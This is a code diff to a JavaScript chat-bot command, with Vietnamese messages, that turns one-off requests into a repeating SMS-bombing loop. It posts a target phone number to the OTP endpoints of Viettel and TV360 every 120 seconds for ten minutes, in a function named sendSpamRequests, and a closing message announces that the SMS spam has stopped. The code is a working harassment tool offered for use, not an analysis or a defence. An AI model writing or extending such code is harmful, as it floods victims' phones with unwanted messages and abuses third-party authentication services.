@@ -58,28 +58,43 @@ module.exports = {
       msisdn: phone
     };
 
-    // Send request to Viettel API
-    axios.post('https://viettel.vn/api/get-otp', viettelData, {
-      headers: viettelHeaders,
-      withCredentials: true,
-      cookies: viettelCookies,
-    })
-    .then(response => {
-      api.sendMessage(`Gửi thông báo thành công đến số ${phone} qua Viettel API`, event.threadID, event.messageID);
-    })
-    .catch(error => {
-      api.sendMessage(`Gửi thông báo thất bại đến số ${phone} qua Viettel API: ${error.message}`, event.threadID, event.messageID);
-    });
+    // Function to send spam requests
+    const sendSpamRequests = () => {
+      // Send request to Viettel API
+      axios.post('https://viettel.vn/api/get-otp', viettelData, {
+        headers: viettelHeaders,
+        withCredentials: true,
+        cookies: viettelCookies,
+      })
+      .then(response => {
+        api.sendMessage(`Gửi thông báo thành công đến số ${phone} qua Viettel API`, event.threadID, event.messageID);
+      })
+      .catch(error => {
+        api.sendMessage(`Gửi thông báo thất bại đến số ${phone} qua Viettel API: ${error.message}`, event.threadID, event.messageID);
+      });
 
-    // Send request to TV360 API
-    axios.post("http://m.tv360.vn/public/v1/auth/get-otp-login", tv360Data, {
-      headers: tv360Headers
-    })
-    .then(response => {
-      api.sendMessage(`Gửi thông báo thành công đến số ${phone} qua TV360 API`, event.threadID, event.messageID);
-    })
-    .catch(error => {
-      api.sendMessage(`Gửi thông báo thất bại đến số ${phone} qua TV360 API: ${error.message}`, event.threadID, event.messageID);
-    });
+      // Send request to TV360 API
+      axios.post("http://m.tv360.vn/public/v1/auth/get-otp-login", tv360Data, {
+        headers: tv360Headers
+      })
+      .then(response => {
+        api.sendMessage(`Gửi thông báo thành công đến số ${phone} qua TV360 API`, event.threadID, event.messageID);
+      })
+      .catch(error => {
+        api.sendMessage(`Gửi thông báo thất bại đến số ${phone} qua TV360 API: ${error.message}`, event.threadID, event.messageID);
+      });
+    };
+
+    // Send the spam requests every 120 seconds (120000 milliseconds)
+    const interval = setInterval(sendSpamRequests, 120000);
+
+    // Send the first spam request immediately
+    sendSpamRequests();
+
+    // Optionally, stop spamming after a certain time period
+    setTimeout(() => {
+      clearInterval(interval);
+      api.sendMessage(`Đã dừng spam SMS cho số ${phone}`, event.threadID, event.messageID);
+    }, 600000); // Stop after 10 minutes (600000 milliseconds)
   }
 };
